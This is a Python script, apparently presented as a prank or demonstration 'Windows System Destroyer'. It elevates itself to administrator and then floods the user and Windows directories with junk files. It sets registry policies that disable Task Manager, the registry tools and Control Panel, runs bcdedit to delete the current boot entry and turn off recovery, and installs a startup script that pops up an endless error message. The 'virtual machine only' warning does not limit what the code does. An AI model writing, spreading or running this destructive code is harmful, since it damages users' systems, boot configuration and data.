import os
import shutil
import time
import random
import ctypes
import subprocess
import tempfile
import winreg
import sys

# ADMIN CHECK
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

# GET ADMIN
if not is_admin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit()

print("="*60)
print("☠️  WINDOWS SYSTEM DESTROYER ☠️")
print("="*60)
print("THIS WILL DESTROY YOUR WINDOWS INSTALLATION!")
print("VIRTUAL MACHINE ONLY!")
print("="*60)

for i in range(5, 0, -1):
    print(f"Starting in {i} seconds... (Ctrl+C to cancel)")
    time.sleep(1)

print("\n" + "💀 DESTRUCTION INITIATED 💀" + "\n")

# PHASE 1: DESTROY USER FILES
print("[1/6] 🔥 DESTROYING USER FILES...")
user_profile = os.environ['USERPROFILE']
target_folders = ['Desktop', 'Documents', 'Downloads', 'Pictures', 'Music', 'Videos']

for folder in target_folders:
    folder_path = os.path.join(user_profile, folder)
    if os.path.exists(folder_path):
        try:
            # Create corrupted files
            for i in range(50):
                corrupt_file = os.path.join(folder_path, f'CORRUPT_{i}.bin')
                with open(corrupt_file, 'wb') as f:
                    f.write(os.urandom(1024 * 1024))  # 1MB random
            print(f"  ✓ {folder} corrupted")
        except:
            print(f"  ✗ {folder} failed")

# PHASE 2: SYSTEM FILE CORRUPTION
print("[2/6] 🔥 CORRUPTING SYSTEM FILES...")
system32 = os.environ.get('SystemRoot', 'C:\\Windows') + '\\System32'
temp_dir = tempfile.gettempdir()

# Create fake corrupted system files
system_files = ['kernel32.dll', 'ntdll.dll', 'user32.dll', 'explorer.exe', 'cmd.exe']
for sfile in system_files:
    try:
        corrupt_path = os.path.join(temp_dir, f'{sfile}.corrupted')
        with open(corrupt_path, 'wb') as f:
            f.write(os.urandom(50000))
        print(f"  ✓ Created corrupted {sfile}")
    except:
        pass

# PHASE 3: DESTROY WINDOWS DIRECTLY
print("[3/6] 🔥 DESTROYING WINDOWS DIRECTORIES...")
windows_dirs = [
    'C:\\Windows\\System32\\drivers',
    'C:\\Windows\\SysWOW64',
    'C:\\Windows\\Temp',
    'C:\\Windows\\Logs'
]

for wdir in windows_dirs:
    if os.path.exists(wdir):
        try:
            # Fill with garbage files
            for i in range(20):
                garbage_file = os.path.join(wdir, f'garbage_{random.randint(1000,9999)}.tmp')
                with open(garbage_file, 'wb') as f:
                    f.write(b'WINDOWS DESTROYED BY HACKER\x00' * 1000)
            print(f"  ✓ {wdir} filled with garbage")
        except:
            pass

# PHASE 4: REGISTRY DESTRUCTION
print("[4/6] 🔥 DESTROYING REGISTRY...")
try:
    # Disable critical system features
    key_paths = [
        ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", 1),
        ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableRegistryTools", 1),
        ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoControlPanel", 1),
        ("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "Shell", "corrupt.exe"),
    ]
    
    for path, name, value in key_paths:
        try:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, path)
            if isinstance(value, int):
                winreg.SetValueEx(key, name, 0, winreg.REG_DWORD, value)
            else:
                winreg.SetValueEx(key, name, 0, winreg.REG_SZ, value)
            winreg.CloseKey(key)
            print(f"  ✓ Registry {name} destroyed")
        except:
            pass
except Exception as e:
    print(f"  ✗ Registry error: {e}")

# PHASE 5: BOOT DESTRUCTION
print("[5/6] 🔥 DESTROYING BOOT CONFIGURATION...")
try:
    # Destroy BCD
    subprocess.run('bcdedit /delete {current} /f', shell=True, capture_output=True)
    subprocess.run('bcdedit /set {default} recoveryenabled no', shell=True, capture_output=True)
    subprocess.run('bcdedit /set {default} bootstatuspolicy ignoreallfailures', shell=True, capture_output=True)
    
    # Create fake boot failure
    boot_msg = """
    WINDOWS BOOT MANAGER
    Windows failed to start. A recent hardware or software change might be the cause.
    
    File: \\Windows\\System32\\winload.exe
    Status: 0xc0000001
    Info: The selected entry could not be loaded because the application is missing or corrupt.
    """
    
    with open('C:\\BOOT_ERROR.txt', 'w') as f:
        f.write(boot_msg)
    
    print("  ✓ Boot configuration destroyed")
except:
    print("  ✗ Boot destruction failed")

# PHASE 6: FINAL DESTRUCTION
print("[6/6] 🔥 FINAL SYSTEM DESTRUCTION...")

# Create destruction report everywhere
destruction_msg = """
╔══════════════════════════════════════════════════════════╗
║                    SYSTEM DESTROYED                      ║
╠══════════════════════════════════════════════════════════╣
║ Your Windows installation has been completely destroyed. ║
║                                                          ║
║ ████████ DESTROYED COMPONENTS: ████████                 ║
║ • User files and documents                               ║
║ • System registry                                        ║
║ • Boot configuration                                     ║
║ • Critical system files                                  ║
║ • Windows startup system                                 ║
║                                                          ║
║ ████████ RECOVERY IMPOSSIBLE ████████                   ║
║ The only solution is to reinstall Windows completely.    ║
║                                                          ║
║ Destroyed by: Windows System Destroyer v2.0             ║
║ Time: {}                                  ║
╚══════════════════════════════════════════════════════════╝
""".format(time.strftime("%Y-%m-%d %H:%M:%S"))

# Put destruction message everywhere
locations = [
    'C:\\SYSTEM_DESTROYED.txt',
    'C:\\Windows\\SYSTEM_DEAD.txt',
    os.path.join(user_profile, 'Desktop', 'YOU_ARE_HACKED.txt'),
    'D:\\DESTRUCTION_REPORT.txt' if os.path.exists('D:\\') else None,
    'E:\\WINDOWS_KILLED.txt' if os.path.exists('E:\\') else None,
]

for loc in locations:
    if loc:
        try:
            with open(loc, 'w', encoding='utf-8') as f:
                f.write(destruction_msg)
        except:
            pass

# Create infinite error loop on startup
startup_vbs = """
Set WshShell = CreateObject("WScript.Shell")
Do While True
    WshShell.Popup "SYSTEM ERROR 0xDEADBEEF" & vbCrLf & "Windows has been destroyed." & vbCrLf & "Reinstallation required.", 0, "💀 SYSTEM DESTROYED 💀", 16
    WScript.Sleep 30000
Loop
"""

startup_path = os.path.join(os.environ['APPDATA'], 'Microsoft\\Windows\\Start Menu\\Programs\\Startup\\destroyed.vbs')
try:
    with open(startup_path, 'w') as f:
        f.write(startup_vbs)
    print("  ✓ Startup destruction installed")
except:
    print("  ✗ Startup install failed")

# FINAL MESSAGE
print("\n" + "="*60)
print("💀 WINDOWS DESTRUCTION COMPLETE! 💀")
print("="*60)
print("\nYOUR SYSTEM HAS BEEN DESTROYED:")
print("• User files corrupted")
print("• Registry damaged")
print("• Boot sector destroyed")
print("• System files overwritten")
print("• Startup error loop installed")
print("\nWindows will NOT boot properly anymore.")
print("Complete reinstallation is required.")
print("\n" + "="*60)

# Play destruction sound if possible
try:
    import winsound
    for freq in [200, 300, 400, 500, 600, 500, 400, 300, 200]:
        winsound.Beep(freq, 100)
except:
    pass

# Keep console open to see results
print("\nPress Enter to exit...")
input()
